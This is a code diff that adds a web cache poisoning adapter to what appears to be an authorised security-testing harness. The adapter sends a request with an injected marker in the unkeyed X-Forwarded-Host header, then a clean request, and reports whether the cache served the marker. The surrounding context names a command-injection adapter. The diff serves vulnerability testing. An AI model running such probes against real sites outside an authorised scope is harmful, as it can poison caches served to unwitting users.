@@ -654,6 +654,52 @@ class PathAdapter(_Adapter):
         }
 
 
+class CacheAdapter(_Adapter):
+    """Web cache poisoning via unkeyed input against a pinned in-scope target. Registered
+    as `cache`.
+
+    The harness sends a cache-busting request that injects a random marker through an
+    unkeyed header (X-Forwarded-Host), then a second, clean request for the same URL, and
+    reports poisoning only when the clean request is served the injected marker, which
+    proves the marker was cached under a key that ignored the header and handed to a victim
+    who never sent it. The marker is the harness's and travels only in the first request's
+    header, so a cache that keys on the header (or does not reflect it) never serves it on
+    the clean request; the Verifier repeats the pair against a fresh snapshot."""
+
+    _HEADER = "X-Forwarded-Host"
+
+    def run(self, req):
+        ip = self._resolve(req["target"])
+        port = int(req["port"])
+        args = req.get("args") or {}
+        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
+        path = args.get("path", "/promo")
+        buster = "hccb" + secrets.token_hex(4)                # our own cache key: first hit is a miss
+        marker = "evil-" + secrets.token_hex(6) + ".hc-probe.test"
+        qs = urllib.parse.urlencode({"cb": buster})
+        url = f"{scheme}://{ip}:{port}{path}?{qs}"
+        s_poison, b_poison = self._send_http(url, "GET", {self._HEADER: marker})
+        reflected = marker in b_poison                        # the miss reflected our header
+        s_clean, b_clean = self._send_http(url, "GET")        # a victim's clean request
+        served_from_cache = marker in b_clean
+        hit = reflected and served_from_cache
+        return {
+            "status": "ok" if hit else "error",
+            "parsed": {"poison_status": s_poison, "clean_status": s_clean,
+                       "reflected": reflected, "served_from_cache": served_from_cache},
+            "request_bytes": f"cache {url} unkeyed {self._HEADER}".encode("utf-8"),
+            "response_bytes": f"poison[{s_poison}] clean[{s_clean}] cached={served_from_cache}".encode("utf-8"),
+            "deterministic_signals": {
+                "hit": hit,
+                "cache_poison": hit,
+                "reflected": reflected,
+                "served_from_cache": served_from_cache,
+                "status_code": s_clean,
+                "confidence": 0.9 if hit else 0.0,
+            },
+        }
+
+
 class CmdiAdapter(_Adapter):
     """OS command injection via a timing oracle against a pinned in-scope target.
     Registered as `cmdi`.
